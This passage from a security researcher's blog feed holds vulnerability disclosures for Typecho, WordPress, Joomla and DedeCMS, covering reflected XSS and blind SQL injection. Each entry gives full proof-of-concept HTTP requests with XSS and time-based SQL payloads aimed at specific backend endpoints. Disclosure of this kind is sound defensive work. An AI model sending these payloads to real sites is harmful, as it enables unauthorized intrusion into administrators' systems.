u5DD_2132_forum_lastvisit=D_2_1677498054; u5DD_2132_st_t=1%7C1677498055%7C9149ebde1ec47006277ae3faf93f0e2f; u5DD_2132_editormode_e=1; u5DD_2132_st_p=1%7C1677498095%7C926ebc78300a154f5ad9ebb023eb0b77; u5DD_2132_viewid=tid_1; u5DD_2132_seccode=5.792e3c6d8b004d4403; u5DD_2132_seccodecSE52ETX=6.a73b7daa353701b59a</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>44</span><br><span class="line"></span><br><span class="line"><span class="language-xml">coid[]=1&amp;cid=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--</span></span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/2.png"></p><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/3.png"></p><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/4.png"></p><p><img src="/2023/03/02/Typecho-V1.2.0-Backend-Reflected-XSS-cid/5.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/typecho/typecho/issues/1539">Github Issue</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Typecho-V1.2.0 with Backend Reflected Cross-Site Scripting in backend /admin/manage-comments.php via unfiltered POST parameter &quot;cid&quot;.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>WordPress V6.2 Backend Reflected-XSS</title>
    <link href="https://srpopty.github.io/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/"/>
    <id>https://srpopty.github.io/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/</id>
    <published>2023-02-27T08:19:35.000Z</published>
    <updated>2023-02-27T08:19:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend theme file editor component with reflected-XSS via POST parameter <code>newcontent</code> when the POST parameter <code>theme</code> does not exist.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>WordPress &lt;= 6.2</p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin background management, editing a theme file in theme file editor component.</li><li>POST to <code>/wp-admin/theme-editor.php</code> with the right wordpress nonce, as well as the <code>newcontent</code> parameter which contains the XSS payload, e.g. <code>&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;&lt;!--</code>, remove the <code>theme</code> parameter at the same time.</li></ol><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/2.png"></p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/3.png"></p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/4.png"></p><p>In source code of <code>/wp-admin/theme-editor.php</code>, at line 125, the <code>newcontent</code> passes to <code>$post_content</code>, but <code>wp_unslash</code> does not filter any XSS payload.</p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/5.png"></p><p>At line 129, <code>$post_content</code> passes to <code>$content</code>, and at line 291, the <code>$content</code> is directly echoed to html.</p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/6.png"></p><p><img src="/2023/02/27/WordPress-V6.2-Backend-Refltecd-XSS-newcontent/7.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/wordpress/wp-admin/theme-editor.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.10</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>193</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.0.10</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.10/cms/wordpress/wp-admin/theme-editor.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>wordpress_a59a53e68d3cbba0d705bf0e4b02207b=admin%7C1678689608%7C1S0SKogKJyuDtqkpi3cDcwCyeAvKDNdQ6OW4BtMYgJQ%7Caf4d97cb01e4752e872af6fc5226c89263904830dda087656dbbd0fa79fcf29a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_a59a53e68d3cbba0d705bf0e4b02207b=admin%7C1678689608%7C1S0SKogKJyuDtqkpi3cDcwCyeAvKDNdQ6OW4BtMYgJQ%7Ce2441da59527b55b9831572be4c5a5955c9acb44a4d72e2477feabfbb4efba21; wp-settings-time-1=1677480056; PHPSESSID=m7h7isuus6cugk6mb58vdah296</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">nonce<span class="operator">=</span>f<span class="number">8</span>bc<span class="number">8439</span>a<span class="number">1</span>&amp;_wp_http_referer<span class="operator">=</span><span class="variable">%2</span>Fcms<span class="variable">%2</span>Fwordpress<span class="variable">%2</span>Fwp-admin<span class="variable">%2</span>Ftheme-editor.php&amp;newcontent<span class="operator">=</span>&lt;/textarea&gt;&lt;img<span class="variable">%20</span>src<span class="operator">=</span><span class="keyword">x</span><span class="variable">%20</span>onerror<span class="operator">=</span>alert(<span class="number">1</span>)&gt;&lt;<span class="title">!--</span>&amp;action<span class="operator">=</span>update&amp;file<span class="operator">=</span>style.css&amp;themexxx<span class="operator">=</span>twentytwentythree</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://hackerone.com/bugs?report_id=1888329&subject=user">HackerOne</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">WordPress-V6.2 with Reflected-XSS in backend /wp-admin/theme-editor.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Joomla V4.2.8 Backend Reflected-XSS</title>
    <link href="https://srpopty.github.io/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/"/>
    <id>https://srpopty.github.io/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/</id>
    <published>2023-02-27T07:24:16.000Z</published>
    <updated>2023-02-27T07:24:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend Multi-factor Authentication component with reflected-XSS via base64-encoded GET parameters <code>returnurl</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Joomla &lt;= 4.2.8</p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to Joomla CMS admin backend management, enter into the Multi-factor Authentication component.</li><li>No matter add a new or edit an existed multi-factor authentication method, there is always a base64-encoded URL parameter <code>returnurl</code>.</li><li>The value of <code>returnurl</code> will be decoded by base64 and appeared in html attribute <code>href</code> of <code>&lt;a&gt;</code> tag, which in the “Save &amp; Close” and “Cancel” button.</li><li>Change the value of <code>returnurl</code> to base64-encoded XSS payload, e.g. <code>amF2YXNjcmlwdDphbGVydCgxKTs=</code>, which is the <code>javascript: alert(1)</code>, and request the page with <code>returnurl</code> parameter, the payload will be injected to the “href”.</li></ol><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/2.png"></p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/3.png"></p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/4.png"></p><p><img src="/2023/02/27/Joomla-V4.2.8-Backend-Refltecd-XSS-returnvalue/5.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/joomla/administrator/index.php?option=com_users&amp;task=method.add&amp;method=yubikey&amp;user_id=220&amp;returnurl=amF2YXNjcmlwdDphbGVydCgxKTs%3D</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>atumSidebarState=open; 8bf89f010a5bbff54669e4ad47111f59=8nunecujukuvngvnu63fptrr0t; c04ce7edc2a8825a69f250555054fe73=ujj34jaqqm0md1cihnph0q3a20; PHPSESSID=enl8bvb5tmdfidt9kmvvekicr7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://huntr.dev/bounties/1fb9daa4-417a-4730-bb9e-46ea0b865184">huntr</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Joomla-V4.2.8 with Reflected-XSS in backend /administrator/index.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS V5.7.160 Backend Blind SQL Injection</title>
    <link href="https://srpopty.github.io/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/"/>
    <id>https://srpopty.github.io/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/</id>
    <published>2023-02-26T16:38:53.000Z</published>
    <updated>2023-02-26T16:38:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend story catalog blind SQL injection via post parameters.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DedeCMS &lt;= 5.7.160</p><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management.</li><li>Request to <code>/dede/story_catalog.php</code> with GET parameter <code>action=uprank</code> and POST parameters <code>rank_1=1&#39;+and+sleep(3)+and+&#39;1</code>, this payload will lead to a time-based SQL injection.</li><li>Requires <code>PHP ≤ 5</code> and <code>MySQL ≤ 5.5</code>, and the story component contains at least one record in database.</li><li>In the source code of <code>/dede/story_catalog.php</code>, when the GET parameter <code>action</code> is <code>uprank</code>, the POST value which the key contains <code>rank_</code> will be directly joined into the update SQL statement, which lead to SQL update injection, finally the joint statement will be passed through <code>mysqli_query</code>, but this function only return boolean value when the query string is an update statement, that is why this is a blind injection.</li></ol><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/2.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/dedecms/dede/story_catalog.php?action=uprank</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.8</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>menuitems=1_1%2C2_1%2C3_1; PHPSESSID=k5ten9v1ljuogh8pjae2idof0b; _csrf_name_273c7533=e59946ea73ad488a9da6a03897480ac5; _csrf_name_273c75331BH21ANI1AGD297L1FF21LN02BGE1DNG=6c93980ce4934236; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0462031c83e0ae08; DedeLoginTime=1677428501; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=d9cb1c6293c6c17e; ENV_GOBACK_URL=%2Fcms%2Fdedecms%2Fdede%2Fstory_books.php</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">rank_1</span>=<span class="number">1</span>&#x27;+and+sleep(<span class="number">3</span>)+and+&#x27;<span class="number">1</span></span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">DedeCMS-V5.7.160 with Backend Blind SQL injection in backend /dede/story_catalog.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="SQLi" scheme="https://srpopty.github.io/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS V5.7.160 Backend Blind SQL Injection</title>
    <link href="https://srpopty.github.io/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/"/>
    <id>https://srpopty.github.io/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/</id>
    <published>2023-02-26T16:38:53.000Z</published>
    <updated>2023-02-26T16:38:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend group store blind SQL injection via post parameters.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DedeCMS &lt;= 5.7.160</p><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management.</li><li>Request to <code>/dede/group_store.php</code> with GET parameter <code>action=uprank</code> and POST parameters <code>rank_1=1&#39;+and+sleep(3)+and+&#39;1</code>, this payload will lead to a time-based SQL injection.</li><li>In the source code of <code>/dede/group_store.php</code>, when the GET parameter <code>action</code> is <code>uprank</code>, the POST value which the key contains <code>rank_</code> will be directly joined into the update SQL statement, which lead to SQL update injection, finally the joint statement will be passed through <code>mysqli_query</code>, but this function only return boolean value when the query string is an update statement, that is why this is a blind injection.</li></ol><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/2.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/dedecms/dede/group_store.php?action=uprank</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>menuitems=1_1%2C2_1%2C3_1; PHPSESSID=k5ten9v1ljuogh8pjae2idof0b; _csrf_name_273c7533=e59946ea73ad488a9da6a03897480ac5; _csrf_name_273c75331BH21ANI1AGD297L1FF21LN02BGE1DNG=6c93980ce4934236; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0462031c83e0ae08; DedeLoginTime=1677428501; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=d9cb1c6293c6c17e; ENV_GOBACK_URL=%2Fcms%2Fdedecms%2Fdede%2Fgroup_store.php</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">rank_1</span>=<span class="number">1</span>&#x27;+and+sleep(<span class="number">3</span>)+and+&#x27;<span class="number">1</span></span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">DedeCMS-V5.7.160 with Backend Blind SQL injection in backend /dede/group_store.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="SQLi" scheme="https://srpopty.github.io/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS V5.7.160 Backend Reflected XSS</title>
    <link href="https://srpopty.github.io/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/"/>
    <id>https://srpopty.github.io/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/</id>
    <published>2023-02-26T14:47:13.000Z</published>
    <updated>2023-02-26T14:47:13.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend image file upload with reflected-XSS in uploaded filename.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DedeCMS &lt;= 5.7.160</p><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management.</li><li>In <code>/dede/upload.php</code>, upload an new image file named “file”, with the filename contains XSS payload, e.g. <code>&lt;img src=x onerror=alert(1)&gt;.png</code>.</li><li>The uploaded filename must ends with a normal image extension, e.g. <code>.png</code> or <code>.jpeg</code>, and the file content must contains the legal image file header, filename should not contains and <code>/</code> or <code>\</code>.</li><li>The response of <code>/dede/upload.php</code> contains the XSS payload with the <code>text/html</code> content-type.</li></ol><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/2.png"></p><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/3.png"></p><p>In source code, the filename is directly passed through the <code>pathinfo</code> function and assigned to <code>$res[&#39;remark&#39;]</code>, and finally echoed json encoded array, which contains the XSS payload, and by default, the response content-type is <code>text/html</code>.</p><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/4.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/dedecms/dede/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.3</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>317</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8dr4oJI5ByNkMbkK</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>menuitems=1_1%2C4_1%2C5_1%2C6_1%2C2_1%2C3_1; PHPSESSID=n5ibb5j70gj24qh8alr61u6ov2; _csrf_name_1d27e3c9=426b27a62d00e1341c13019bf34f4d05; _csrf_name_1d27e3c91BH21ANI1AGD297L1FF21LN02BGE1DNG=6e24882e1c219de6; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=c7079a345e8c8682; DedeLoginTime=1677347766; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=8163b03f86d69dc6; ENV_GOBACK_URL=%2Fcms%2Fdedecms%2Fdede%2Fcontent_i_list.php%3Fchannelid%3D2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-mel">------WebKitFormBoundary8dr4oJI5ByNkMbkK</span></span><br><span class="line"><span class="language-mel">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;&lt;img src=x onerror=alert(1)&gt;.png&quot;</span></span></span><br><span class="line"><span class="language-mel">Content-Type: <span class="keyword">image</span>/png</span></span><br><span class="line"><span class="language-mel"></span></span><br><span class="line"><span class="language-mel">PNG</span></span><br><span class="line"><span class="language-mel"></span></span><br><span class="line"><span class="language-mel">IHDR(-SPLTEà<span class="number">22</span>ßÿêé]³ôß&amp;&amp;<span class="number">1</span>%dIDATc<span class="string">``</span><span class="string">`dbfaec@,¶hQGÜYIEND®B`</span></span></span><br><span class="line"><span class="language-mel">------WebKitFormBoundary8dr4oJI5ByNkMbkK--</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">DedeCMS-V5.7.160 with Backend Reflected Cross-Site Scripting in backend /dede/upload.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Typecho V1.2.0 Backend Reflected XSS</title>
    <link href="https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/"/>
    <id>https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/</id>
    <published>2023-02-21T12:12:27.000Z</published>
    <updated>2023-02-21T12:12:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Typecho admin backend management system with reflected-XSS in the name of an arbitrarily supplied URL parameter.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to typecho admin backend management system, in <code>/admin/index.php</code>, <code>admin/themes.php</code> or <code>/admin/backup.php</code>.</li><li>In the name of an arbitrarily supplied URL parameter, no matter key or value, will be injected to a html href attribute of <code>&lt;a&gt;</code> tag.</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/typecho/admin/?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--bbb=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.10</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: 